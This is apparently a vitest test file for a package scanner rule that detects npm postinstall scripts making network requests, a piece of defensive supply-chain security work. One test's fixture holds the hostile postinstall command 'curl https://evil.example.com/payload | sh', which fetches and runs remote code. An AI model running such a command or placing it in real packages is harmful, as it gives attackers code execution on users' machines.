import { describe, it, expect } from 'vitest';
import * as path from 'node:path';
import { postinstallNetwork } from '../../../src/scan/rules/postinstall-network.js';
import type { PackageMeta } from '../../../src/scan/types.js';

const FIXTURES = path.resolve(__dirname, '../../fixtures/node_modules');

function metaFor(name: string): PackageMeta {
  const pkgPath = path.join(FIXTURES, name);
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const raw = require(path.join(pkgPath, 'package.json'));
  return { name, version: raw.version ?? '0.0.0', path: pkgPath, raw };
}

describe('Rule 1: postinstall_network', () => {
  it('flags a package with https.request in postinstall source', async () => {
    const findings = await postinstallNetwork.check(metaFor('fake-postinstall-network'));
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0]!.rule).toBe('postinstall_network');
    expect(findings[0]!.severity).toBe('high');
    expect(findings[0]!.package).toBe('fake-postinstall-network@1.0.0');
    expect(findings[0]!.file).toContain('postinstall.js');
  });

  it('does NOT flag a clean package', async () => {
    const findings = await postinstallNetwork.check(metaFor('fake-clean-pkg'));
    expect(findings).toEqual([]);
  });

  it('flags curl in a shell postinstall script string', async () => {
    const meta: PackageMeta = {
      name: 'fake-curl-pkg',
      version: '1.0.0',
      path: path.join(FIXTURES, 'fake-clean-pkg'),
      raw: { scripts: { postinstall: 'curl https://evil.example.com/payload | sh' } },
    };
    const findings = await postinstallNetwork.check(meta);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0]!.description).toContain('curl');
  });
});
